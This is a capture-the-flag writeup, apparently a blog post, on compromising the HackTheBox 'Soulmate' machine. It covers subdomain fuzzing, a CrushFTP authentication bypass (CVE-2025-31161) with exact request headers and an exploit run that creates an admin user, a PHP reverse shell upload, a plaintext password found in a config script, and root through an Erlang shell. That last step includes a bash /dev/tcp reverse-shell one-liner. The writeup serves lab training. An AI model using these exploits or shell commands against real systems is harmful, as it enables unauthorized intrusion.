@@ -1,0 +1,164 @@
+---
+title: Soulmate
+date: '2026-02-19'
+description: 'Writeup for the Soulmate machine .'
+type: writeup
+platform: hackthebox
+difficulty: easy
+tags:
+  - EASY
+  - HTB
+cover: /mc/images/tokyo.jpg
+---
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+hello today we gonna start doing a old machine from HTB named Soulmate from Season9 i think
+
+## Recon
+
+so lets start with a small nmap
+
+```bash
+nmap -A 10.129.3.19
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-13 19:06 -0500
+Nmap scan report for soulmate.htb (10.129.3.19)
+Host is up (0.081s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Soulmate - Find Your Perfect Match
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.14
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## Website Discovery
+
+after creating a profile , i thought we are not gonna find something even if we upload an image so i start to Fuzz the subdomains to find if there is something interesting
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.129.3.19 -H "Host: FUZZ.soulmate.htb" -fs 154
+
+ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 86ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 675 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
+```
+
+so we found a FTP subdomain ftp.soulmate.htb
+
+so after accessing the FTP subdomain we found that is running on crushFTP so we gonna look for some vulnerabilies or something so if not we gonna look somewhere else
+
+### **CVE-2025-31161**
+
+so after trying reading some research on vulnerabilities on this application i found this POC [https://www.exploit-db.com/exploits/52295](https://www.exploit-db.com/exploits/52295) and this one too [https://projectdiscovery.io/blog/crushftp-authentication-bypass](https://projectdiscovery.io/blog/crushftp-authentication-bypass) , so i copy the Header Authorization and the Cookieand the path , and the exploits works (as in the image)
+
+```bash
+GET /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=1111 HTTP/1.1
+Cookie: CrushAuth=1111111111_111111111111111111111111111111111
+Authorization: AWS4-HMAC-SHA256 Credential=crushadmin
+```
+
+![abusing the CVE and adding the headers to ftp soulmate website](https://nutzh.top/wp-content/uploads/2026/02/Screenshot-2026-02-14-014602-1024x552.png)
+
+after that i tried to create a user with the POC we found
+
+```bash
+$ python exploit.py --target ftp.soulmate.htb --exploit --new-user admin1 --password P@ssw0rd --port 80
+
+[36m          
+  / ____/______  _______/ /_  / ____/ /_____ 
+ / /   / ___/ / / / ___/ __ \/ /_  / __/ __ \
+/ /___/ /  / /_/ (__  ) / / / __/ / /_/ /_/ /
+\____/_/   \__,_/____/_/ /_/_/    \__/ .___/ 
+                                    /_/      
+[32mCVE-2025-31161 Exploit 2.0.0[33m | [36m Developer @ibrahimsql
+[0m
+
+Exploiting 1 targets with 10 threads...
+[+] Successfully created user admin1 on ftp.soulmate.htb
+Exploiting targets... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% (1/1) 0:00:00
+
+Exploitation complete! Successfully exploited 1/1 targets.
+
+Exploited Targets:
+→ ftp.soulmate.htb
+
+Summary:
+Total targets: 1
+Vulnerable targets: 0
+Exploited targets: 1
+```
+
+## Initial Access
+
+after creating the admin we go to to Admin Panel and go for User management , after that we gonna see that Ben is the only user that can be used to upload the shell.hpp and get the rev shell with it , so we gonna first change the password for Ben , and access again to CrushFTP as him after that we gonna copy a php rev shell from [revshells.com](http://revshells.com) and upload it to the server and we gonna have the shell
+
+```bash
+nc -vlntp 1234                   
+listening on [any] 1234 ...
+connect to [10.10.16.15] from (UNKNOWN) [10.129.3.19] 46068
+Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 01:15:00 up  1:23,  0 users,  load average: 0.07, 0.06, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (1152): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@soulmate:/tmp$
+```
+
+after that i run linpeas and pspy64 to see the procesuss running on the machine , and i found that there is a binary named erlang , so after asking Chatgpt and looking around i found a CVE for this binary it works but the problem is just keeping doing the same thing even with some modification [https://github.com/ProDefense/CVE-2025-32433/blob/main/CVE-2025-32433.py](https://github.com/ProDefense/CVE-2025-32433/blob/main/CVE-2025-32433.py)
+
+![](https://nutzh.top/wp-content/uploads/2026/02/Screenshot-2026-02-14-033322-1-1024x171.png)
+
+so i tried to do it manually and read the files inside the machine so i start with the processus start.script and luckly i found the password of the user ben
+
+```bash
+www-data@soulmate:/tmp$ cat /usr/local/lib/erlang_login/start.escript
+ <snip>
+        {user_passwords, [{"ben", "HouseH0ldings998"}]},
+        {idle_time, infinity},
+        {max_channels, 10},
+        {max_sessions, 10},
+        {parallel_login, true}
+    ]) of
+        {ok, _Pid} ->
+            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
+        {error, Reason} ->
+            io:format("Failed to start SSH daemon: ~p~n", [Reason])
+    end,
+
+    receive
+        stop -> ok
+    end.
+```
+
+## Priv Escalation
+
+so we authenticate as the user ben and that is gonna help us to access the shell of ssh_runner with the command
+
+```bash
+ben@soulmate:~$ ssh -p 2222 ben@127.0.0.1
+ben@127.0.0.1's password: #HouseH0ldings998
+Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
+(ssh_runner@soulmate)1> os:cmd("id").
+"uid=0(root) gid=0(root) groups=0(root)\n"
+(ssh_runner@soulmate)3> os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.XX.XX/4444 0>&1'").
+
+#attacker side 
+nc -vltp 4444
+root@soulmate:/# whoami
+whoami
+root
+root@soulmate:/# 
+```
